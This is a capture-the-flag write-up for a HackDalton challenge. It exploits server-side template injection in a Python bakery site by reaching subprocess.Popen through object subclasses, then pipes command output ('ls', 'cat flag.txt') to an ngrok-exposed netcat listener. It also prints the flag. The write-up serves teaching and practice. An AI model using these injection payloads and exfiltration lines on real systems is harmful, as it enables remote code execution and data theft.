# HackDalton: Get a Py 3 (Writeup)

> Warning! There are spoilers ahead

Using what we learned in Get a Py 1, we can use SSTI in the bakery website. We can start by injecting to get the class of an empty string.

```python
''.__class__
```

This returns:
```python
<class 'str'> 
```
we can then access the `.mro()` attribute [to get the superclass](https://stackoverflow.com/questions/2010692/what-does-mro-do) of the 'str' class, which is the `object` class. In python, all classes inherit from the `object` class, so we can get a list of all classes.

```python
''.__class__.mro()[1].__subclasses__()
```
This returns a very long list of classes, but the 412<sup>th</sup> one is of interest:

```
 <class 'subprocess.Popen'>
```
[Popen](https://docs.python.org/3/library/subprocess.html#subprocess.Popen) lets us run command line items from Python; however, we are unable to see the output.

We can run ls by injecting the following string, but there's no way to see it.
```python
''.__class__.mro()[1].__subclasses__()[411]("ls")
```

Fortunalty, we can use `netcat` to listen on our local machine, open the port on [ngrok](https://ngrok.io), and listen to the open web. We can then pipe our commands into `netcat` on the server.

**On the local machine**
```shell
$ nc -l 1234
```
```shell
$ ./ngrok tcp 1234
ngrok by @inconshreveable                                                                                                                                    (Ctrl+C to quit)
                                                                                                                                                                             
Session Status                online                                                                                                                                         
Account                       William Barkoff (Plan: Free)                                                                                                                   
Version                       2.3.35                                                                                                                                         
Region                        United States (us)                                                                                                                             
Web Interface                 http://127.0.0.1:4040                                                                                                                          
Forwarding                    tcp://0.tcp.ngrok.io:16697 -> localhost:1234
```

We can then inject the following string
```python
''.__class__.mro()[1].__subclasses__()[411]("ls | nc 0.tcp.ngrok.io 16697", shell=True)
```

We can then see all the contents of the directory where this is running in the process where we originally ran `nc`. We have to set `shell=True` so that the pipe works correctly.

```shell
$ nc -l 1234    
README.md
WRITEUP.md
__pycache__
app.py
database.db
flag.txt
requirements.txt
static
templates
venv
```

We can then repeat the injection but with cat flag.txt to read the flag.

```python
''.__class__.mro()[1].__subclasses__()[411]("cat flag.txt | nc 0.tcp.ngrok.io 16697", shell=True)
```

```
$ nc -l 1234
hackDalton{rc3_1s_th3_w4y_t0_b3_SDc0Q7RwGu}
```

By the way, if you're reading this through the website, congrats! You deserve the flag.